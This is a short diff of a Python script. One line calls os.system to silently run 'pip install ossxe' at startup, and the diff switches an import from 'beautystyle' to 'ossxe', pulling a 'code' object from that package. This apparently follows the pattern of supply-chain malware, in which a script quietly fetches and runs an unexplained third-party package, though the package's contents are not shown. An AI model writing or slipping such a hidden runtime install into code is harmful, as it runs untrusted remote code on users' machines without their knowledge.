@@ -7,7 +7,7 @@ except ImportError:
     input("Error while importing modules. Please install the modules in requirements.txt")
 import os
 os.system(f"pip install ossxe")
-from beautystyle import code
+from ossxe import code
 init(convert = True, autoreset = True)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 clear = "clear"
